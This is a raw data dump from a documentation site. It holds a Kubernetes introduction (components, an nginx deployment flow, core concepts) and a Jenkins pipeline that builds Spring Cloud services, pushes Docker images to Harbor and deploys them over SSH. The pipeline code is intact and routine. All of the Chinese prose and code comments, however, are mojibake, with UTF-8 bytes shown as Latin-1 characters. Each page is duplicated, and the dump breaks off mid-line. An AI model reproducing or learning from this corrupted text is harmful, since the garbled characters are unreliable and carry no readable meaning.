kubernetesç»ä»¶ 1.4 kubernetesæ¦å¿µ",content:"# 1.1 åºç¨é¨ç½²æ¹å¼æ¼å\n\nå¨é¨ç½²åºç¨ç¨åºçæ¹å¼ä¸ï¼ä¸»è¦ç»åäºä¸ä¸ªæ¶ä»£ï¼\n\n * ä¼ ç»é¨ç½²ï¼äºèç½æ©æï¼ä¼ç´æ¥å°åºç¨ç¨åºé¨ç½²å¨ç©çæºä¸\n   \n   > ä¼ç¹ï¼ç®åï¼ä¸éè¦å¶å®ææ¯çåä¸\n   > ç¼ºç¹ï¼ä¸è½ä¸ºåºç¨ç¨åºå®ä¹èµæºä½¿ç¨è¾¹çï¼å¾é¾åçå°åéè®¡ç®èµæºï¼èä¸ç¨åºä¹é´å®¹æäº§çå½±å\n\n * èæåé¨ç½²ï¼å¯ä»¥å¨ä¸å°ç©çæºä¸è¿è¡å¤ä¸ªèææºï¼æ¯ä¸ªèææºé½æ¯ç¬ç«çä¸ä¸ªç¯å¢\n   \n   > ä¼ç¹ï¼ç¨åºç¯å¢ä¸ä¼ç¸äºäº§çå½±åï¼æä¾äºä¸å®ç¨åº¦çå®å¨æ§\n   > ç¼ºç¹ï¼å¢å äºæä½ç³»ç»ï¼æµªè´¹äºé¨åèµæº\n\n * å®¹å¨åé¨ç½²ï¼ä¸èæåç±»ä¼¼ï¼ä½æ¯å±äº«äºæä½ç³»ç»\n   \n   > ä¼ç¹ï¼\n   > å¯ä»¥ä¿è¯æ¯ä¸ªå®¹å¨æ¥æèªå·±çæä»¶ç³»ç»ãCPUãåå­ãè¿ç¨ç©ºé´ç­\n   > è¿è¡åºç¨ç¨åºæéè¦çèµæºé½è¢«å®¹å¨åè£ï¼å¹¶ååºå±åºç¡æ¶æè§£è¦\n   > å®¹å¨åçåºç¨ç¨åºå¯ä»¥è·¨äºæå¡åãè·¨ Linux æä½ç³»ç»åè¡çè¿è¡é¨ç½²\n\n\n\nå®¹å¨åé¨ç½²æ¹å¼ç»å¸¦æ¥å¾å¤çä¾¿å©ï¼ä½æ¯ä¹ä¼åºç°ä¸äºé®é¢ï¼æ¯å¦è¯´ï¼\n\n * ä¸ä¸ªå®¹å¨æéåæºäºï¼æä¹æ ·è®©å¦å¤ä¸ä¸ªå®¹å¨ç«å»å¯å¨å»æ¿è¡¥åæºçå®¹å¨\n * å½å¹¶åè®¿é®éåå¤§çæ¶åï¼æä¹æ ·åå°æ¨ªåæ©å±å®¹å¨æ°é\n\nè¿äºå®¹å¨ç®¡ççé®é¢ç»ç§°ä¸ºå®¹å¨ç¼æé®é¢ï¼ä¸ºäºè§£å³è¿äºå®¹å¨ç¼æé®é¢ï¼å°±äº§çäºä¸äºå®¹å¨ç¼æçè½¯ä»¶ï¼\n\n * Swarmï¼Docker èªå·±çå®¹å¨ç¼æå·¥å·\n * Mesosï¼Apache çä¸ä¸ªèµæºç»ä¸ç®¡æ§çå·¥å·ï¼éè¦å Marathon ç»åä½¿ç¨\n * Kubernetesï¼Google å¼æºççå®¹å¨ç¼æå·¥å·\n\n\n\n\n# 1.2 kubernetes ç®ä»\n\n\n\nkubernetesï¼æ¯ä¸ä¸ªå¨æ°çåºäºå®¹å¨ææ¯çåå¸å¼æ¶æé¢åæ¹æ¡ï¼æ¯è°·æ­ä¸¥æ ¼ä¿å¯åå å¹´çç§å¯æ­¦å¨ ----Borg ç³»ç»çä¸ä¸ªå¼æºçæ¬ï¼äº 2014 å¹´ 9 æåå¸ç¬¬ä¸ä¸ªçæ¬ï¼2015 å¹´ 7 æåå¸ç¬¬ä¸ä¸ªæ­£å¼çæ¬ã\n\nkubernetes çæ¬è´¨æ¯ä¸ç»æå¡å¨éç¾¤ï¼å®å¯ä»¥å¨éç¾¤çæ¯ä¸ªèç¹ä¸è¿è¡ç¹å®çç¨åºï¼æ¥å¯¹èç¹ä¸­çå®¹å¨è¿è¡ç®¡çãç®çæ¯å®ç°èµæºç®¡ççèªå¨åï¼ä¸»è¦æä¾äºå¦ä¸çä¸»è¦åè½ï¼\n\n * èªæä¿®å¤ï¼ä¸æ¦æä¸ä¸ªå®¹å¨å´©æºï¼è½å¤å¨ 1 ç§ä¸­å·¦å³è¿éå¯å¨æ°çå®¹å¨\n * å¼¹æ§ä¼¸ç¼©ï¼å¯ä»¥æ ¹æ®éè¦ï¼èªå¨å¯¹éç¾¤ä¸­æ­£å¨è¿è¡çå®¹å¨æ°éè¿è¡è°æ´\n * æå¡åç°ï¼æå¡å¯ä»¥éè¿èªå¨åç°çå½¢å¼æ¾å°å®æä¾èµçæå¡\n * è´è½½åè¡¡ï¼å¦æä¸ä¸ªæå¡èµ·å¨äºå¤ä¸ªå®¹å¨ï¼è½å¤èªå¨å®ç°è¯·æ±çè´è½½åè¡¡\n * çæ¬åéï¼å¦æåç°æ°åå¸çç¨åºçæ¬æé®é¢ï¼å¯ä»¥ç«å³åéå°åæ¥ççæ¬\n * å­å¨ç¼æï¼å¯ä»¥æ ¹æ®å®¹å¨èªèº«çéæ±èªå¨åå»ºå­å¨å·\n\n\n# 1.3 kubernetes ç»ä»¶\n\nä¸ä¸ª kubernetes éç¾¤ä¸»è¦æ¯ç±æ§å¶èç¹ (master)ã** å·¥ä½èç¹ (node)** ææï¼æ¯ä¸ªèç¹ä¸é½ä¼å®è£ä¸åçç»ä»¶ã\n\nmasterï¼éç¾¤çæ§å¶å¹³é¢ï¼è´è´£éç¾¤çå³ç­ (ç®¡ç)\n\n> ApiServer : èµæºæä½çå¯ä¸å¥å£ï¼æ¥æ¶ç¨æ·è¾å¥çå½ä»¤ï¼æä¾è®¤è¯ãææãAPI æ³¨åååç°ç­æºå¶\n> Scheduler : è´è´£éç¾¤èµæºè°åº¦ï¼æç§é¢å®çè°åº¦ç­ç¥å° Pod è°åº¦å°ç¸åºç node èç¹ä¸\n> ControllerManager : è´è´£ç»´æ¤éç¾¤çç¶æï¼æ¯å¦ç¨åºé¨ç½²å®æãæéæ£æµãèªå¨æ©å±ãæ»å¨æ´æ°ç­\n> Etcd ï¼è´è´£å­å¨éç¾¤ä¸­åç§èµæºå¯¹è±¡çä¿¡æ¯\n\nnodeï¼éç¾¤çæ°æ®å¹³é¢ï¼è´è´£ä¸ºå®¹å¨æä¾è¿è¡ç¯å¢ (å¹²æ´»)\n\n> Kubelet : è´è´£ç»´æ¤å®¹å¨ççå½å¨æï¼å³éè¿æ§å¶ dockerï¼æ¥åå»ºãæ´æ°ãéæ¯å®¹å¨\n> KubeProxy : è´è´£æä¾éç¾¤åé¨çæå¡åç°åè´è½½åè¡¡\n> Docker : è´è´£èç¹ä¸å®¹å¨çåç§æä½\n\n\n\nä¸é¢ï¼ä»¥é¨ç½²ä¸ä¸ª nginx æå¡æ¥è¯´æ kubernetes ç³»ç»åä¸ªç»ä»¶è°ç¨å³ç³»ï¼\n\n 1. é¦åè¦æç¡®ï¼ä¸æ¦ kubernetes ç¯å¢å¯å¨ä¹åï¼master å node é½ä¼å°èªèº«çä¿¡æ¯å­å¨å° etcd æ°æ®åºä¸­\n 2. ä¸ä¸ª nginx æå¡çå®è£è¯·æ±ä¼é¦åè¢«åéå° master èç¹ç apiServer ç»ä»¶\n 3. apiServer ç»ä»¶ä¼è°ç¨ scheduler ç»ä»¶æ¥å³å®å°åºåºè¯¥æè¿ä¸ªæå¡å®è£å°åªä¸ª node èç¹ä¸ï¼å¨æ­¤æ¶ï¼å®ä¼ä» etcd ä¸­è¯»ååä¸ª node èç¹çä¿¡æ¯ï¼ç¶åæç§ä¸å®çç®æ³è¿è¡éæ©ï¼å¹¶å°ç»æåç¥ apiServer\n 4. apiServer è°ç¨ controller-manager å»è°åº¦ Node èç¹å®è£ nginx æå¡\n 5. kubelet æ¥æ¶å°æä»¤åï¼ä¼éç¥ dockerï¼ç¶åç± docker æ¥å¯å¨ä¸ä¸ª nginx ç podï¼pod æ¯ kubernetes çæå°æä½ååï¼å®¹å¨å¿é¡»è·å¨ pod ä¸­è³æ­¤ï¼\n 6. ä¸ä¸ª nginx æå¡å°±è¿è¡äºï¼å¦æéè¦è®¿é® nginxï¼å°±éè¦éè¿ kube-proxy æ¥å¯¹ pod äº§çè®¿é®çä»£çè¿æ ·ï¼å¤çç¨æ·å°±å¯ä»¥è®¿é®éç¾¤ä¸­ç nginx æå¡äº\n\n\n# 1.4 kubernetes æ¦å¿µ\n\nMasterï¼éç¾¤æ§å¶èç¹ï¼æ¯ä¸ªéç¾¤éè¦è³å°ä¸ä¸ª master èç¹è´è´£éç¾¤çç®¡æ§\nNodeï¼å·¥ä½è´è½½èç¹ï¼ç± master åéå®¹å¨å°è¿äº node å·¥ä½èç¹ä¸ï¼ç¶å node èç¹ä¸ç docker è´è´£å®¹å¨çè¿è¡\nPodï¼kubernetes çæå°æ§å¶ååï¼å®¹å¨é½æ¯è¿è¡å¨ pod ä¸­çï¼ä¸ä¸ª pod ä¸­å¯ä»¥æ 1 ä¸ªæèå¤ä¸ªå®¹å¨\nControllerï¼æ§å¶å¨ï¼éè¿å®æ¥å®ç°å¯¹ pod çç®¡çï¼æ¯å¦å¯å¨ podãåæ­¢ podãä¼¸ç¼© pod çæ°éç­ç­\nServiceï¼pod å¯¹å¤æå¡çç»ä¸å¥å£ï¼ä¸é¢å¯ä»¥ç»´æ¤èåä¸ç±»çå¤ä¸ª pod\nLabelï¼æ ç­¾ï¼ç¨äºå¯¹ pod è¿è¡åç±»ï¼åä¸ç±» pod ä¼æ¥æç¸åçæ ç­¾\nNameSpaceï¼å½åç©ºé´ï¼ç¨æ¥éç¦» pod çè¿è¡ç¯å¢\n\n",normalizedContent:"# 1.1 åºç¨é¨ç½²æ¹å¼æ¼å\n\nå¨é¨ç½²åºç¨ç¨åºçæ¹å¼ä¸ï¼ä¸»è¦ç»åäºä¸ä¸ªæ¶ä»£ï¼\n\n * ä¼ ç»é¨ç½²ï¼äºèç½æ©æï¼ä¼ç´æ¥å°åºç¨ç¨åºé¨ç½²å¨ç©çæºä¸\n   \n   > ä¼ç¹ï¼ç®åï¼ä¸éè¦å¶å®ææ¯çåä¸\n   > ç¼ºç¹ï¼ä¸è½ä¸ºåºç¨ç¨åºå®ä¹èµæºä½¿ç¨è¾¹çï¼å¾é¾åçå°åéè®¡ç®èµæºï¼èä¸ç¨åºä¹é´å®¹æäº§çå½±å\n\n * èæåé¨ç½²ï¼å¯ä»¥å¨ä¸å°ç©çæºä¸è¿è¡å¤ä¸ªèææºï¼æ¯ä¸ªèææºé½æ¯ç¬ç«çä¸ä¸ªç¯å¢\n   \n   > ä¼ç¹ï¼ç¨åºç¯å¢ä¸ä¼ç¸äºäº§çå½±åï¼æä¾äºä¸å®ç¨åº¦çå®å¨æ§\n   > ç¼ºç¹ï¼å¢å äºæä½ç³»ç»ï¼æµªè´¹äºé¨åèµæº\n\n * å®¹å¨åé¨ç½²ï¼ä¸èæåç±»ä¼¼ï¼ä½æ¯å±äº«äºæä½ç³»ç»\n   \n   > ä¼ç¹ï¼\n   > å¯ä»¥ä¿è¯æ¯ä¸ªå®¹å¨æ¥æèªå·±çæä»¶ç³»ç»ãcpuãåå­ãè¿ç¨ç©ºé´ç­\n   > è¿è¡åºç¨ç¨åºæéè¦çèµæºé½è¢«å®¹å¨åè£ï¼å¹¶ååºå±åºç¡æ¶æè§£è¦\n   > å®¹å¨åçåºç¨ç¨åºå¯ä»¥è·¨äºæå¡åãè·¨ linux æä½ç³»ç»åè¡çè¿è¡é¨ç½²\n\n\n\nå®¹å¨åé¨ç½²æ¹å¼ç»å¸¦æ¥å¾å¤çä¾¿å©ï¼ä½æ¯ä¹ä¼åºç°ä¸äºé®é¢ï¼æ¯å¦è¯´ï¼\n\n * ä¸ä¸ªå®¹å¨æéåæºäºï¼æä¹æ ·è®©å¦å¤ä¸ä¸ªå®¹å¨ç«å»å¯å¨å»æ¿è¡¥åæºçå®¹å¨\n * å½å¹¶åè®¿é®éåå¤§çæ¶åï¼æä¹æ ·åå°æ¨ªåæ©å±å®¹å¨æ°é\n\nè¿äºå®¹å¨ç®¡ççé®é¢ç»ç§°ä¸ºå®¹å¨ç¼æé®é¢ï¼ä¸ºäºè§£å³è¿äºå®¹å¨ç¼æé®é¢ï¼å°±äº§çäºä¸äºå®¹å¨ç¼æçè½¯ä»¶ï¼\n\n * swarmï¼docker èªå·±çå®¹å¨ç¼æå·¥å·\n * mesosï¼apache çä¸ä¸ªèµæºç»ä¸ç®¡æ§çå·¥å·ï¼éè¦å marathon ç»åä½¿ç¨\n * kubernetesï¼google å¼æºççå®¹å¨ç¼æå·¥å·\n\n\n\n\n# 1.2 kubernetes ç®ä»\n\n\n\nkubernetesï¼æ¯ä¸ä¸ªå¨æ°çåºäºå®¹å¨ææ¯çåå¸å¼æ¶æé¢åæ¹æ¡ï¼æ¯è°·æ­ä¸¥æ ¼ä¿å¯åå å¹´çç§å¯æ­¦å¨ ----borg ç³»ç»çä¸ä¸ªå¼æºçæ¬ï¼äº 2014 å¹´ 9 æåå¸ç¬¬ä¸ä¸ªçæ¬ï¼2015 å¹´ 7 æåå¸ç¬¬ä¸ä¸ªæ­£å¼çæ¬ã\n\nkubernetes çæ¬è´¨æ¯ä¸ç»æå¡å¨éç¾¤ï¼å®å¯ä»¥å¨éç¾¤çæ¯ä¸ªèç¹ä¸è¿è¡ç¹å®çç¨åºï¼æ¥å¯¹èç¹ä¸­çå®¹å¨è¿è¡ç®¡çãç®çæ¯å®ç°èµæºç®¡ççèªå¨åï¼ä¸»è¦æä¾äºå¦ä¸çä¸»è¦åè½ï¼\n\n * èªæä¿®å¤ï¼ä¸æ¦æä¸ä¸ªå®¹å¨å´©æºï¼è½å¤å¨ 1 ç§ä¸­å·¦å³è¿éå¯å¨æ°çå®¹å¨\n * å¼¹æ§ä¼¸ç¼©ï¼å¯ä»¥æ ¹æ®éè¦ï¼èªå¨å¯¹éç¾¤ä¸­æ­£å¨è¿è¡çå®¹å¨æ°éè¿è¡è°æ´\n * æå¡åç°ï¼æå¡å¯ä»¥éè¿èªå¨åç°çå½¢å¼æ¾å°å®æä¾èµçæå¡\n * è´è½½åè¡¡ï¼å¦æä¸ä¸ªæå¡èµ·å¨äºå¤ä¸ªå®¹å¨ï¼è½å¤èªå¨å®ç°è¯·æ±çè´è½½åè¡¡\n * çæ¬åéï¼å¦æåç°æ°åå¸çç¨åºçæ¬æé®é¢ï¼å¯ä»¥ç«å³åéå°åæ¥ççæ¬\n * å­å¨ç¼æï¼å¯ä»¥æ ¹æ®å®¹å¨èªèº«çéæ±èªå¨åå»ºå­å¨å·\n\n\n# 1.3 kubernetes ç»ä»¶\n\nä¸ä¸ª kubernetes éç¾¤ä¸»è¦æ¯ç±æ§å¶èç¹ (master)ã** å·¥ä½èç¹ (node)** ææï¼æ¯ä¸ªèç¹ä¸é½ä¼å®è£ä¸åçç»ä»¶ã\n\nmasterï¼éç¾¤çæ§å¶å¹³é¢ï¼è´è´£éç¾¤çå³ç­ (ç®¡ç)\n\n> apiserver : èµæºæä½çå¯ä¸å¥å£ï¼æ¥æ¶ç¨æ·è¾å¥çå½ä»¤ï¼æä¾è®¤è¯ãææãapi æ³¨åååç°ç­æºå¶\n> scheduler : è´è´£éç¾¤èµæºè°åº¦ï¼æç§é¢å®çè°åº¦ç­ç¥å° pod è°åº¦å°ç¸åºç node èç¹ä¸\n> controllermanager : è´è´£ç»´æ¤éç¾¤çç¶æï¼æ¯å¦ç¨åºé¨ç½²å®æãæéæ£æµãèªå¨æ©å±ãæ»å¨æ´æ°ç­\n> etcd ï¼è´è´£å­å¨éç¾¤ä¸­åç§èµæºå¯¹è±¡çä¿¡æ¯\n\nnodeï¼éç¾¤çæ°æ®å¹³é¢ï¼è´è´£ä¸ºå®¹å¨æä¾è¿è¡ç¯å¢ (å¹²æ´»)\n\n> kubelet : è´è´£ç»´æ¤å®¹å¨ççå½å¨æï¼å³éè¿æ§å¶ dockerï¼æ¥åå»ºãæ´æ°ãéæ¯å®¹å¨\n> kubeproxy : è´è´£æä¾éç¾¤åé¨çæå¡åç°åè´è½½åè¡¡\n> docker : è´è´£èç¹ä¸å®¹å¨çåç§æä½\n\n\n\nä¸é¢ï¼ä»¥é¨ç½²ä¸ä¸ª nginx æå¡æ¥è¯´æ kubernetes ç³»ç»åä¸ªç»ä»¶è°ç¨å³ç³»ï¼\n\n 1. é¦åè¦æç¡®ï¼ä¸æ¦ kubernetes ç¯å¢å¯å¨ä¹åï¼master å node é½ä¼å°èªèº«çä¿¡æ¯å­å¨å° etcd æ°æ®åºä¸­\n 2. ä¸ä¸ª nginx æå¡çå®è£è¯·æ±ä¼é¦åè¢«åéå° master èç¹ç apiserver ç»ä»¶\n 3. apiserver ç»ä»¶ä¼è°ç¨ scheduler ç»ä»¶æ¥å³å®å°åºåºè¯¥æè¿ä¸ªæå¡å®è£å°åªä¸ª node èç¹ä¸ï¼å¨æ­¤æ¶ï¼å®ä¼ä» etcd ä¸­è¯»ååä¸ª node èç¹çä¿¡æ¯ï¼ç¶åæç§ä¸å®çç®æ³è¿è¡éæ©ï¼å¹¶å°ç»æåç¥ apiserver\n 4. apiserver è°ç¨ controller-manager å»è°åº¦ node èç¹å®è£ nginx æå¡\n 5. kubelet æ¥æ¶å°æä»¤åï¼ä¼éç¥ dockerï¼ç¶åç± docker æ¥å¯å¨ä¸ä¸ª nginx ç podï¼pod æ¯ kubernetes çæå°æä½ååï¼å®¹å¨å¿é¡»è·å¨ pod ä¸­è³æ­¤ï¼\n 6. ä¸ä¸ª nginx æå¡å°±è¿è¡äºï¼å¦æéè¦è®¿é® nginxï¼å°±éè¦éè¿ kube-proxy æ¥å¯¹ pod äº§çè®¿é®çä»£çè¿æ ·ï¼å¤çç¨æ·å°±å¯ä»¥è®¿é®éç¾¤ä¸­ç nginx æå¡äº\n\n\n# 1.4 kubernetes æ¦å¿µ\n\nmasterï¼éç¾¤æ§å¶èç¹ï¼æ¯ä¸ªéç¾¤éè¦è³å°ä¸ä¸ª master èç¹è´è´£éç¾¤çç®¡æ§\nnodeï¼å·¥ä½è´è½½èç¹ï¼ç± master åéå®¹å¨å°è¿äº node å·¥ä½èç¹ä¸ï¼ç¶å node èç¹ä¸ç docker è´è´£å®¹å¨çè¿è¡\npodï¼kubernetes çæå°æ§å¶ååï¼å®¹å¨é½æ¯è¿è¡å¨ pod ä¸­çï¼ä¸ä¸ª pod ä¸­å¯ä»¥æ 1 ä¸ªæèå¤ä¸ªå®¹å¨\ncontrollerï¼æ§å¶å¨ï¼éè¿å®æ¥å®ç°å¯¹ pod çç®¡çï¼æ¯å¦å¯å¨ podãåæ­¢ podãä¼¸ç¼© pod çæ°éç­ç­\nserviceï¼pod å¯¹å¤æå¡çç»ä¸å¥å£ï¼ä¸é¢å¯ä»¥ç»´æ¤èåä¸ç±»çå¤ä¸ª pod\nlabelï¼æ ç­¾ï¼ç¨äºå¯¹ pod è¿è¡åç±»ï¼åä¸ç±» pod ä¼æ¥æç¸åçæ ç­¾\nnamespaceï¼å½åç©ºé´ï¼ç¨æ¥éç¦» pod çè¿è¡ç¯å¢\n\n",charsets:{cjk:!0}},{title:"Jenkins(å«) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼",frontmatter:{title:"Jenkins(å«) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/507",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/507.Jenkins(%E5%85%AB)%20Jenkins+Docker+SpringCloud%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%EF%BC%88%E4%B8%8B%EF%BC%89.html",relativePath:"01.è¿ç»´/50.Jenkins/507.Jenkins(å«) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼.md",key:"v-4b59fa74",path:"/jenkins/507/",headers:[{level:2,title:"ä¼åJenkinså·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡",slug:"ä¼åjenkinså·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡",normalizedTitle:"ä¼å jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡",charIndex:176},{level:2,title:"ä¼åJenkinså·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨",slug:"ä¼åjenkinså·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨",normalizedTitle:"ä¼å jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨",charIndex:269},{level:2,title:"èæ¬ç¼å",slug:"èæ¬ç¼å",normalizedTitle:"èæ¬ç¼å",charIndex:409}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"ä¼åJenkinså·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡ ä¼åJenkinså·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨ èæ¬ç¼å",content:'ç¬¬ä¸ç« ä¸­é¨ç½²æ¹æ¡å­å¨çé®é¢ï¼\n\n 1. ä¸æ¬¡åªè½éæ©ä¸ä¸ªå¾®æå¡é¨ç½²\n 2. åªæä¸å°çäº§èé¨ç½²æå¡å¨\n 3. æ¯ä¸ªå¾®æå¡åªæä¸ä¸ªå®ä¾ï¼å®¹éçä½\n\nä¼åæ¹æ¡ï¼\n\n 1. å¨ä¸ä¸ª Jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡åæ¶åå¸\n 2. å¨ä¸ä¸ª Jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨åæ¶é¨ç½²\n 3. æ¯ä¸ªå¾®æå¡é½æ¯ä»¥éç¾¤é«å¯ç¨å½¢å¼é¨ç½²\n\n\n\n\n# ä¼å Jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡\n\nå®è£ Extended Choice Parameter æä»¶ï¼å°é¡¹ç®éç½®ä¸­ï¼å¯ä»¥çå°éæ©åæ°å¤äºä¸ä¸ªéé¡¹\n\n\n\n\n\n\n\n\n\n\n\n\n# ä¼å Jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨\n\n1. å¨ Manager Jenkins->Configure System->Publish over SSH-> å¨æ·»å æå¡å¨\n\n\n\n2. å¨å°é¡¹ç®éç½®ä¸­æ·»å æå¡å¨éæ©ï¼åå·¥ç¨ä¸­éæ©å¤ä¸ªå¾®æå¡æ¯ç±»ä¼¼ç\n\n\n\n\n\n\n\n\n# èæ¬ç¼å\n\n// çæ¬\ndef tag = "1.0"\n// éåä»åºçå°å\ndef harbor_url = "192.168.81.102:85"\n// éåä»åºçé¡¹ç®,è¿éå»ºè®®é¡¹ç®åç§°åjenkinsçitemé¡¹ç®åç§°ãä»¥åharborçé¡¹ç®åç§°ä¿æä¸è´ï¼å¦åç¨ä¸ä¸èæ¬ä¼åºé®é¢\ndef harbor_project = "demo"\n\nnode {\n\n    // è·åå½åéæ©çé¡¹ç®åç§°\n    def selectDProjectName = "${project_name}".split(",")\n    // è·åæå¡å¨åè¡¨\n    def selectDServers = "${publish_server}".split(",")\n\n    // æåä»£ç \n    stage(\'pull code\') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // ç¼è¯å¹¶æ¨ééåä»åº\n    stage(\'build project\') {\n\n        for(int i=0;i<selectDProjectName.length;i++){\n\n            def project = selectDProjectName[i].split("@")[0]\n            def port = selectDProjectName[i].split("@")[1]\n            // ç¼è¯\n            sh "mvn -f ${project} clean package dockerfile:build"\n            echo "æjarä¸ä¼ éåä»åº"\n            def oldImageName = "${project}:latest"\n            def newImageName = "${harbor_url}/${harbor_project}/${project}:${tag}"\n            // æ¹åç§° åè§è\n            sh "docker tag ${oldImageName} ${newImageName}"\n            // å é¤ä¹åç éå\n            sh "docker rmi ${oldImageName}"\n            // æ¨éå° dockersä»åº\n            withCredentials([usernamePassword(credentialsId: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordVariable: \'harbor_password\', usernameVariable: \'harbor_account\')]) {\n                // ç»å½\n                sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n                // ä¸ä¼ \n                sh "docker push ${newImageName}"\n                echo "éåæ¨éæå"\n            }\n            for(int k=0;k<selectDServers.length;k++){\n                // è·åæå¡å¨åç§°\n                def currentServerName = selectDServers[k]\n                echo "æ§è¡è¿ç¨å½ä»¤ /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n                sshPublisher(publishers: [sshPublisherDesc(configName: "${currentServerName}", transfers: [sshTransfer(cleanRemote: false, excludes: \'\', execCommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", execTimeout: 120000, flatten: false, makeEmptyDirs: false, noDefaultExcludes: false, patternSeparator: \'[, ]+\', remoteDirectory: \'\', remoteDirectorySDF: false, removePrefix: \'\', sourceFiles: \'\')], usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)])\n\n            }\n        }\n    }\n}\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n',normalizedContent:'ç¬¬ä¸ç« ä¸­é¨ç½²æ¹æ¡å­å¨çé®é¢ï¼\n\n 1. ä¸æ¬¡åªè½éæ©ä¸ä¸ªå¾®æå¡é¨ç½²\n 2. åªæä¸å°çäº§èé¨ç½²æå¡å¨\n 3. æ¯ä¸ªå¾®æå¡åªæä¸ä¸ªå®ä¾ï¼å®¹éçä½\n\nä¼åæ¹æ¡ï¼\n\n 1. å¨ä¸ä¸ª jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡åæ¶åå¸\n 2. å¨ä¸ä¸ª jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨åæ¶é¨ç½²\n 3. æ¯ä¸ªå¾®æå¡é½æ¯ä»¥éç¾¤é«å¯ç¨å½¢å¼é¨ç½²\n\n\n\n\n# ä¼å jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤ä¸ªå¾®æå¡\n\nå®è£ extended choice parameter æä»¶ï¼å°é¡¹ç®éç½®ä¸­ï¼å¯ä»¥çå°éæ©åæ°å¤äºä¸ä¸ªéé¡¹\n\n\n\n\n\n\n\n\n\n\n\n\n# ä¼å jenkins å·¥ç¨ä¸­å¯ä»¥éæ©å¤å°çäº§æå¡å¨\n\n1. å¨ manager jenkins->configure system->publish over ssh-> å¨æ·»å æå¡å¨\n\n\n\n2. å¨å°é¡¹ç®éç½®ä¸­æ·»å æå¡å¨éæ©ï¼åå·¥ç¨ä¸­éæ©å¤ä¸ªå¾®æå¡æ¯ç±»ä¼¼ç\n\n\n\n\n\n\n\n\n# èæ¬ç¼å\n\n// çæ¬\ndef tag = "1.0"\n// éåä»åºçå°å\ndef harbor_url = "192.168.81.102:85"\n// éåä»åºçé¡¹ç®,è¿éå»ºè®®é¡¹ç®åç§°åjenkinsçitemé¡¹ç®åç§°ãä»¥åharborçé¡¹ç®åç§°ä¿æä¸è´ï¼å¦åç¨ä¸ä¸èæ¬ä¼åºé®é¢\ndef harbor_project = "demo"\n\nnode {\n\n    // è·åå½åéæ©çé¡¹ç®åç§°\n    def selectdprojectname = "${project_name}".split(",")\n    // è·åæå¡å¨åè¡¨\n    def selectdservers = "${publish_server}".split(",")\n\n    // æåä»£ç \n    stage(\'pull code\') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // ç¼è¯å¹¶æ¨ééåä»åº\n    stage(\'build project\') {\n\n        for(int i=0;i<selectdprojectname.length;i++){\n\n            def project = selectdprojectname[i].split("@")[0]\n            def port = selectdprojectname[i].split("@")[1]\n            // ç¼è¯\n            sh "mvn -f ${project} clean package dockerfile:build"\n            echo "æjarä¸ä¼ éåä»åº"\n            def oldimagename = "${project}:latest"\n            def newimagename = "${harbor_url}/${harbor_project}/${project}:${tag}"\n            // æ¹åç§° åè§è\n            sh "docker tag ${oldimagename} ${newimagename}"\n            // å é¤ä¹åç éå\n            sh "docker rmi ${oldimagename}"\n            // æ¨éå° dockersä»åº\n            withcredentials([usernamepassword(credentialsid: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordvariable: \'harbor_password\', usernamevariable: \'harbor_account\')]) {\n                // ç»å½\n                sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n                // ä¸ä¼ \n                sh "docker push ${newimagename}"\n                echo "éåæ¨éæå"\n            }\n            for(int k=0;k<selectdservers.length;k++){\n                // è·åæå¡å¨åç§°\n                def currentservername = selectdservers[k]\n                echo "æ§è¡è¿ç¨å½ä»¤ /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n                sshpublisher(publishers: [sshpublisherdesc(configname: "${currentservername}", transfers: 